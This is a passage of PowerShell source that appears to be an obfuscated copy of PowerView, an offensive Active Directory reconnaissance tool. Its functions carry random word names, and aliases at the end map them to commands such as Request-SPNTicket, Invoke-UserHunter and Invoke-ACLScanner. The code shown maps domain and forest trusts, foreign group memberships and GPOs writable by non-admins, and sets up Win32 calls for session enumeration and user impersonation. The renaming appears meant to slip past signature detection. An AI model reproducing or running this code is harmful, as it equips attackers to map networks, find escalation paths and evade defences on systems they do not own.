                $eZqjtdWU99 = $Null
            }
            $WlFAblwQ99 = [IntPtr]::Zero
            $Flags = 63
            $mfLllawx99 = 0
            $XUqUetvM99 = $wMXdfulj99::DsEnumerateDomainTrusts($eZqjtdWU99, $Flags, [ref]$WlFAblwQ99, [ref]$mfLllawx99)
            $MmzaDoyA99 = $WlFAblwQ99.ToInt64()
            if (($XUqUetvM99 -eq 0) -and ($MmzaDoyA99 -gt 0)) {
                $uXfcgJyx99 = $EXGlQFqc99::GetSize()
                for ($i = 0; ($i -lt $mfLllawx99); $i++) {
                    $CguibrMj99 = New-Object System.Intptr -ArgumentList $MmzaDoyA99
                    $Info = $CguibrMj99 -as $EXGlQFqc99
                    $MmzaDoyA99 = $CguibrMj99.ToInt64()
                    $MmzaDoyA99 += $uXfcgJyx99
                    $JtTrVisx99 = ''
                    $XUqUetvM99 = $tXXKHaBR99::ConvertSidToStringSid($Info.DomainSid, [ref]$JtTrVisx99);$LgkmIaxQ99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($XUqUetvM99 -eq 0) {
                        Write-Verbose "[million] Error: $(([ComponentModel.Win32Exception] $LgkmIaxQ99).Message)"
                    }
                    else {
                        $pSZOdsnq99 = New-Object PSObject
                        $pSZOdsnq99 | Add-Member Noteproperty 'SourceName' $HOUZyvyN99
                        $pSZOdsnq99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $pSZOdsnq99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $pSZOdsnq99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $pSZOdsnq99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $pSZOdsnq99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $pSZOdsnq99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $pSZOdsnq99 | Add-Member Noteproperty 'TargetSid' $JtTrVisx99
                        $pSZOdsnq99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $pSZOdsnq99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $pSZOdsnq99
                    }
                }
                $Null = $wMXdfulj99::NetApiBufferFree($WlFAblwQ99)
            }
            else {
                Write-Verbose "[million] Error: $(([ComponentModel.Win32Exception] $XUqUetvM99).Message)"
            }
        }
        else {
            $QEtxmtxZ99 = retrenchments @NetSearcherArguments
            if ($QEtxmtxZ99) {
                $QEtxmtxZ99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function descending {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $tebkulGE99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $TYOebWRu99 = @{}
        if ($PSBoundParameters['Forest']) { $TYOebWRu99['Forest'] = $tebkulGE99 }
        if ($PSBoundParameters['Credential']) { $TYOebWRu99['Credential'] = $xjRyyQze99 }
        $clkmxaWR99 = creatives @NetForestArguments
        if ($clkmxaWR99) {
            $clkmxaWR99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function Nimitz {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{}
        $VrICpjXS99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['Raw']) { $VrICpjXS99['Raw'] = $Raw }
    }
    PROCESS {
        wasteland @SearcherArguments  | ForEach-Object {
            ForEach ($eImHSEaZ99 in $_.memberof) {
                $Index = $eImHSEaZ99.IndexOf('DC=')
                if ($Index) {
                    $noeNUzwE99 = $($eImHSEaZ99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $MogcDKes99 = $_.distinguishedname
                    $EPsTrwBc99 = $MogcDKes99.IndexOf('DC=')
                    $qgzVOkSs99 = $($_.distinguishedname.SubString($EPsTrwBc99)) -replace 'DC=','' -replace ',','.'
                    if ($noeNUzwE99 -ne $qgzVOkSs99) {
                        $KegVfEPD99 = $eImHSEaZ99.Split(',')[0].split('=')[1]
                        $GLUWvhZM99 = New-Object PSObject
                        $GLUWvhZM99 | Add-Member Noteproperty 'UserDomain' $qgzVOkSs99
                        $GLUWvhZM99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $GLUWvhZM99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $GLUWvhZM99 | Add-Member Noteproperty 'GroupDomain' $noeNUzwE99
                        $GLUWvhZM99 | Add-Member Noteproperty 'GroupName' $KegVfEPD99
                        $GLUWvhZM99 | Add-Member Noteproperty 'GroupDistinguishedName' $eImHSEaZ99
                        $GLUWvhZM99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $GLUWvhZM99
                    }
                }
            }
        }
    }
}
function copper {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{}
        $VrICpjXS99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['Raw']) { $VrICpjXS99['Raw'] = $Raw }
    }
    PROCESS {
        $JbShCjrx99 = @('Users', 'Domain Users', 'Guests')
        floors @SearcherArguments | Where-Object { $JbShCjrx99 -notcontains $_.samaccountname } | ForEach-Object {
            $KegVfEPD99 = $_.samAccountName
            $AVWujjYb99 = $_.distinguishedname
            $noeNUzwE99 = $AVWujjYb99.SubString($AVWujjYb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
            $_.member | ForEach-Object {
                $BTmZocnX99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($noeNUzwE99 -ne $BTmZocnX99)) {
                    $RjzGFHwJ99 = $_
                    $nQXDaGVr99 = $_.Split(',')[0].split('=')[1]
                    $mtnaLOhb99 = New-Object PSObject
                    $mtnaLOhb99 | Add-Member Noteproperty 'GroupDomain' $noeNUzwE99
                    $mtnaLOhb99 | Add-Member Noteproperty 'GroupName' $KegVfEPD99
                    $mtnaLOhb99 | Add-Member Noteproperty 'GroupDistinguishedName' $AVWujjYb99
                    $mtnaLOhb99 | Add-Member Noteproperty 'MemberDomain' $BTmZocnX99
                    $mtnaLOhb99 | Add-Member Noteproperty 'MemberName' $nQXDaGVr99
                    $mtnaLOhb99 | Add-Member Noteproperty 'MemberDistinguishedName' $RjzGFHwJ99
                    $mtnaLOhb99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $mtnaLOhb99
                }
            }
        }
    }
}
function yessing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $kQTByXSX99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    $spsNDvuT99 = @{}
    $pcBdHDgA99 = New-Object System.Collections.Stack
    $ivVcFHuD99 = @{}
    if ($PSBoundParameters['API']) { $ivVcFHuD99['API'] = $API }
    if ($PSBoundParameters['NET']) { $ivVcFHuD99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $ivVcFHuD99['LDAPFilter'] = $vqxjYeAS99 }
    if ($PSBoundParameters['Properties']) { $ivVcFHuD99['Properties'] = $PjvsRTzX99 }
    if ($PSBoundParameters['SearchBase']) { $ivVcFHuD99['SearchBase'] = $kNJfXSCC99 }
    if ($PSBoundParameters['Server']) { $ivVcFHuD99['Server'] = $GejzMkbd99 }
    if ($PSBoundParameters['SearchScope']) { $ivVcFHuD99['SearchScope'] = $yuycROvu99 }
    if ($PSBoundParameters['ResultPageSize']) { $ivVcFHuD99['ResultPageSize'] = $vUSyLBJJ99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $ivVcFHuD99['ServerTimeLimit'] = $cNGaYdSy99 }
    if ($PSBoundParameters['Tombstone']) { $ivVcFHuD99['Tombstone'] = $kQTByXSX99 }
    if ($PSBoundParameters['Credential']) { $ivVcFHuD99['Credential'] = $xjRyyQze99 }
    if ($PSBoundParameters['Credential']) {
        $JpLxRbdE99 = (retrenchments -xjRyyQze99 $xjRyyQze99).Name
    }
    else {
        $JpLxRbdE99 = (retrenchments).Name
    }
    $pcBdHDgA99.Push($JpLxRbdE99)
    while($pcBdHDgA99.Count -ne 0) {
        $gddrYpaX99 = $pcBdHDgA99.Pop()
        if ($gddrYpaX99 -and ($gddrYpaX99.Trim() -ne '') -and (-not $spsNDvuT99.ContainsKey($gddrYpaX99))) {
            Write-Verbose "[yessing] Enumerating trusts for domain: '$gddrYpaX99'"
            $Null = $spsNDvuT99.Add($gddrYpaX99, '')
            try {
                $ivVcFHuD99['Domain'] = $gddrYpaX99
                $UHNWkAZT99 = million @DomainTrustArguments
                if ($UHNWkAZT99 -isnot [System.Array]) {
                    $UHNWkAZT99 = @($UHNWkAZT99)
                }
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $YKFWXPXZ99 = @{}
                    if ($PSBoundParameters['Forest']) { $YKFWXPXZ99['Forest'] = $tebkulGE99 }
                    if ($PSBoundParameters['Credential']) { $YKFWXPXZ99['Credential'] = $xjRyyQze99 }
                    $UHNWkAZT99 += descending @ForestTrustArguments
                }
                if ($UHNWkAZT99) {
                    if ($UHNWkAZT99 -isnot [System.Array]) {
                        $UHNWkAZT99 = @($UHNWkAZT99)
                    }
                    ForEach ($Trust in $UHNWkAZT99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $pcBdHDgA99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[yessing] Error: $_"
            }
        }
    }
}
function comparison {
    [CmdletBinding()]
    Param (
        [String]
        $SitfjBbr99 = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $mhMFdqaw99 = 200
    )
    $GXqLBNyj99 = @('SYSTEM','Domain Admins','Enterprise Admins')
    $tebkulGE99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $bUpYgzMW99 = @($tebkulGE99.Domains)
    $pcBdHDgA99 = $bUpYgzMW99 | foreach { $_.GetDirectoryEntry() }
    foreach ($gddrYpaX99 in $pcBdHDgA99) {
        $tGcqvLrx99 = "(&(objectCategory=groupPolicyContainer)(displayname=$SitfjBbr99))"
        $qnVcpqaH99 = New-Object System.DirectoryServices.DirectorySearcher
        $qnVcpqaH99.SearchRoot = $gddrYpaX99
        $qnVcpqaH99.Filter = $tGcqvLrx99
        $qnVcpqaH99.PageSize = $mhMFdqaw99
        $qnVcpqaH99.SearchScope = "Subtree"
        $xfoAINNs99 = $qnVcpqaH99.FindAll()
        foreach ($gpo in $xfoAINNs99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $GXqLBNyj99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $WKqRIYua99 = New-Object psobject
            $WKqRIYua99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $WKqRIYua99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $WKqRIYua99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $WKqRIYua99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $WKqRIYua99
        }
        }
    }
}
$Mod = embryonic -ModuleName Win32
$JAjLKlhU99 = lobbed $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$yVtuevuu99 = lobbed $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$xMqsGAsx99 = lobbed $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$TKZfMCSC99 = lobbed $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$FfLkWDit99 = peelings $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $TKZfMCSC99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$WOIMplSf99 = peelings $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$SMMHPgZe99 = peelings $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}
$almcBnNv99 = peelings $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}
$XyTkCZel99 = peelings $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$FdULbbwj99 = lobbed $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$BCzmuvos99 = peelings $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}
$qiESIIRf99 = peelings $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $FdULbbwj99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = lobbed $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$AjVVqsvT99 = lobbed $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$YGUvHLsH99 = lobbed $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$EXGlQFqc99 = peelings $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $AjVVqsvT99
    TrustAttributes = field 5 $YGUvHLsH99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$yTSgXfIS99 = peelings $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($yTSgXfIS99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | personalizes -Module $Mod -Namespace 'Win32'
$wMXdfulj99 = $Types['netapi32']
$tXXKHaBR99 = $Types['advapi32']
$MmtBvTcD99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
Set-Alias Get-IPAddress prioritize
Set-Alias Convert-NameToSid remissions
Set-Alias Convert-SidToName exaggerations
Set-Alias Request-SPNTicket hobbyhorse
Set-Alias Get-DNSZone McDaniel
Set-Alias Get-DNSRecord payment
Set-Alias Get-NetDomain retrenchments
Set-Alias Get-NetDomainController numbed
Set-Alias Get-NetForest creatives
Set-Alias Get-NetForestDomain tobogganing
Set-Alias Get-NetForestCatalog heists
Set-Alias Get-NetUser wasteland
Set-Alias Get-UserEvent zephyr
Set-Alias Get-NetComputer pickerels
Set-Alias Get-ADObject scram
Set-Alias Set-ADObject thirsted
Set-Alias Get-ObjectAcl striking
Set-Alias Add-ObjectAcl envisioning
Set-Alias Invoke-ACLScanner migrated
Set-Alias Get-GUIDMap skyward
Set-Alias Get-NetOU alleluias
Set-Alias Get-NetSite cooky
Set-Alias Get-NetSubnet augmentation
Set-Alias Get-NetGroup floors
Set-Alias Find-ManagedSecurityGroups gainsaid
Set-Alias Get-NetGroupMember Twitter
Set-Alias Get-NetFileServer outperform
Set-Alias Get-DFSshare enfranchisement
Set-Alias Get-NetGPO funereal
Set-Alias Get-NetGPOGroup wombs
Set-Alias Find-GPOLocation Cardin
Set-Alias Find-GPOComputerAdmin repackaging
Set-Alias Get-LoggedOnLocal stymies
Set-Alias Invoke-CheckLocalAdminAccess portent
Set-Alias Get-SiteName partakes
Set-Alias Get-Proxy modules
Set-Alias Get-LastLoggedOn expedites
Set-Alias Get-CachedRDPConnection roomfuls
Set-Alias Get-RegistryMountedDrive Denmark
Set-Alias Get-NetProcess quadriplegics
Set-Alias Invoke-ThreadedFunction debase
Set-Alias Invoke-UserHunter labyrinths
Set-Alias Invoke-ProcessHunter vivifying
Set-Alias Invoke-EventHunter bootlegger
Set-Alias Invoke-ShareFinder compact
Set-Alias Invoke-FileFinder handmade
Set-Alias Invoke-EnumerateLocalAdmin Rhiannon
Set-Alias Get-NetDomainTrust million
Set-Alias Get-NetForestTrust descending
Set-Alias Find-ForeignUser Nimitz
Set-Alias Find-ForeignGroup copper
Set-Alias Invoke-MapDomainTrust yessing
Set-Alias Get-DomainPolicy molding
